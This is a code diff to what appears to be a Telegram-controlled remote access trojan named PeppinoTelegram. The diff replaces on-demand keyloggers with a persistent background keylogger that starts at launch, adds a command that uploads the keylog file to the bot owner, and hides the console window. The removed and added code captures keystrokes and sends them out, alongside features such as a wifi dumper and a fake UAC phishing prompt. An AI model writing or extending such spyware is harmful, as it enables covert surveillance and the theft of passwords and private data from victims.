@@ -489,6 +489,7 @@ class PeppinoTelegram:
         self.overlay_opencv = OpenCVOverlayPlayer()
         self.audio_mixer = CustomMixer()
         self.audio_player = AudioPlayer()
+        self.keylogger = Keylogger(randomname())
 
         self.wifidumper = WifiDumper()
         self.all_session_messages: list[int] = []
@@ -660,8 +661,7 @@ class PeppinoTelegram:
             Command("cantopenmenu", self.cantopenmenu, "Show blocked processes.", "cant_open", "📋 Cantopenmenu"),
 
             # 🧠 Keylogger
-            Command("keylogger", self.keylogger, "Log keystrokes to file.", "keylogger", "⌨️ Keylogger"),
-            Command("livekeylogger", self.live_keylogger, "Live keystroke monitoring.", "keylogger", "📡 Livekeylogger"),
+            Command("keylogger", self.get_keylog, "Sends the current keylog file.", "keylogger", "⌨️ Keylogger"),
 
             # 🕵️‍♂️ MITM
             Command("block_port", self.block_port, "Block a specific TCP/UDP port.", "mitm", "🚫 Block Port"),
@@ -793,7 +793,7 @@ class PeppinoTelegram:
     
     #@requires_admin
     def block_chrome(self, timeout: int) -> None:
-        raise NotImplemented
+        raise NotImplemented()
         print(f"Blocking chrome for {timeout} seconds")
         loading_bar = self.new_loading_bar_timed_worker("Blocking Chrome", timeout, block_chrome, (timeout,))
         if not loading_bar: return
@@ -1255,7 +1255,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def fakeuac(self) -> None:
         # TODO remove the executable and build it inside the code
         # also maybe with a new phishing menu with other phishing methods
-        raise NotImplemented
+        raise NotImplemented()
         print("Showing fake UAC prompt")
         proc = sp.run(fake_uac_prompt_path, stdout=sp.PIPE, stderr=sp.PIPE)
         if proc.returncode:
@@ -1275,6 +1275,11 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.jumpscare("plankton_meme", "gabinetti")
 
     def handle_conflict(self) -> None:
+        e = self.new_editable_message(
+            self.format_warning_msg("CONFLICT")
+        )
+        sleep(5)
+        e.delete()
         self.stop(confirm=False)
 
     def handle(self, msg: str) -> None:
@@ -1415,159 +1420,20 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         print("Triggering jumpscare without audio")
         self.jumpscare(playaudio=False)
 
-    def keylogger_to_buffer(self, state: dict["value":str,"running":bool]) -> None:
-        print("Starting keylogger to buffer")
-        while state["running"]:
-            event = read_event()
-            if event.event_type == KEY_DOWN:
-                name = event.name
-                if len(name) != 1:
-                    if name == "space":
-                        k=" "
-                    elif name == "maiusc":
-                        continue
-                    elif name == "backspace":
-                        state["value"]=state["value"][:-1]
-                        continue
-                    else:
-                        k=f" <{name.upper()}> "
-                else:
-                    k = name
-                state["value"]+=k
-
-    @cancellable(check_interval=0.08)  # ← adds auto-check loop
-    def keylogger(self, timeout: int = 10) -> None:
-        """
-        Captures keystrokes for `timeout` seconds.
-        Fully cancellable via loading bar cancel button.
-        """
-        self.bsend(f"⌨️ Keylogger started — {timeout} seconds (cancel anytime)")
-
-        buffer = []
-        shift_pressed = False
-        caps_on = False
-        ctrl_pressed = False
-
-        loading = self.new_loading_bar(
-            total=timeout,
-            label="Keylogger",
-            showperc=True,
-        )
-        if not loading: return
-
-        start_time = monotonic()
-
-        try:
-            while monotonic() - start_time < timeout:
-                elapsed = monotonic() - start_time
-                loading.update(elapsed)
-
-                if loading.canceled:
-                    loading.fill_and_delete()
-                    self.bsend("🛑 Keylogger cancelled by user")
-                    return
-
-                # Blocking call — decorator handles interruption via cancel_event
-                event = read_event(suppress=False)
-
-                if event.event_type == KEY_DOWN:
-                    name = event.name.lower()
-
-                    if name in ("left shift", "right shift"):
-                        shift_pressed = True
-                        continue
-                    if name in ("left ctrl", "right ctrl"):
-                        ctrl_pressed = True
-                        continue
-                    if name == "caps lock":
-                        caps_on = not caps_on
-                        continue
-
-                    char = None
-                    if len(name) == 1:
-                        char = name
-                        if shift_pressed != caps_on:
-                            char = char.upper()
-
-                    elif name == "space":
-                        char = " "
-                    elif name == "enter":
-                        char = "\n"
-                    elif name == "tab":
-                        char = "\t"
-                    elif name in ("backspace", "delete"):
-                        if buffer:
-                            buffer.pop()
-                        continue
-                    else:
-                        if name not in ("left", "right", "up", "down", "page up", "page down"):
-                            key = name.upper().replace(" ", "_")
-                            prefix = "CTRL+" if ctrl_pressed else ""
-                            buffer.append(f"[{prefix}{key}]")
-
-                    if char is not None:
-                        buffer.append(char)
-
-                elif event.event_type == KEY_UP:
-                    name_lower = event.name.lower()
-                    if name_lower in ("left shift", "right shift"):
-                        shift_pressed = False
-                    if name_lower in ("left ctrl", "right ctrl"):
-                        ctrl_pressed = False
-
-            loading.fill_and_delete()
-
-            if not buffer:
-                self.bsend("No keys were pressed during this period.")
-                return
-
-            content = "".join(buffer)
-            count = len(buffer)
-
-            file_obj = craft_file(
-                content=content,
-                filename=f"keylog_{datetime.now():%Y-%m-%d_%H%M%S}.txt"
-            )
-
-            self.bot.sendDocument(
-                self.owner_id,
-                document=file_obj,
-                caption=f"Keylogger finished • {count} events captured • {timeout}s"
-            )
-
-            self.bsend(f"Done — {count} characters/events captured.")
-
-        except Exception as e:
-            loading.fill_and_delete()
-            self.bsendWithHtml(
-                f"Keylogger error:\n<pre>{html.escape(str(e))}</pre>"
-            )
+    def get_keylog(self) -> None:
+        self.keylogger.save_to_file()
+        with open(self.keylogger.log_file, "r") as fi:
+            try:
+                fname = f"{randomname()}.keylogger.log"
+                self.bot.sendDocument(self.owner_id, fi)
+            except Exception as e:
+                self.bsend(f"Exception while sending keylogs: \n{e}")
 
     def leftclick(self) -> None:
         print("Left mouse click")
         self.bsendWithHtml("🖱️ Pressing <b>left click</b>")
         pg.leftClick()
 
-    def live_keylogger(self, timeout=10) -> None:
-        print(f"Starting live keylogger for {timeout} seconds")
-        start = monotonic()
-        bar = self.new_loading_bar(timeout, label=f"📡 Live Keylogger")
-        if not bar: return
-        state = {"value":"📡 Live Keylogger Output: ",
-                  "running":True}
-        buffer_message = self.new_editable_message(state["value"])
-        elapsed = 0
-        Thread(target=self.keylogger_to_buffer, args=(state, )).start()
-        while elapsed < timeout:
-            if bar.canceled:
-                bar.fill_and_delete()
-                return
-            elapsed = monotonic()-start
-            bar.update(elapsed)
-            buffer_message.edit(state["value"])
-        state["running"]=False
-        bar.fill_and_delete()
-        
     def load_plugins(self, bot: Bot, plugin_classes: list[type[Plugin]]) -> dict[str, dict[str, Callable]]:
         print("Loading plugins")
         """
@@ -2374,6 +2240,7 @@ The bot is now restarting. Please wait a moment...
 
 <i>⏱️ This may take a few seconds</i>""" if not custom_message else custom_message)
         if doit:
+            self.get_logs()
             restart()
 
     def randomkeyboard(self, timeout: int =5) -> None:
@@ -3121,6 +2988,10 @@ The bot is now restarting. Please wait a moment...
         self.cantopenthread.start()
         STARTING_LOG_MESSAGE.edit("💀 PROGRAM KILLER STARTED")
 
+        self.keylogger_thread = Thread(target=self.keylogger.start, args=(Event(), ))#TODO: replace event with a real binded event and set a better filename and add encryption
+        self.keylogger_thread.start()
+        STARTING_LOG_MESSAGE.edit("⌨️ KEYLOGGER STARTED")
+
         self.timed_restart_thread = Thread(target=self.crash_time_handler)
         self.timed_restart_thread.start()
         STARTING_LOG_MESSAGE.edit("🔄 RESTART TIME HANDLER STARTED")
@@ -3377,4 +3248,5 @@ if __name__ == "__main__":
 
     pep2 = PeppinoTelegram(token,chat_id,ngrok_token,capture,loading_bar_set=[emoji_dict["progress"],emoji_dict["empty_progress"]],loading_bar_spinner=all_spinners["circle_dots"], tunnel_provider="ngrok" if ngrok_token and tunnel_provider=="ngrok" else "localtunnel", logger=logger)
     # I wanted to make this multiple user but the code has become too hard to maintain.
+    hide_console_window()
     pep2.start()
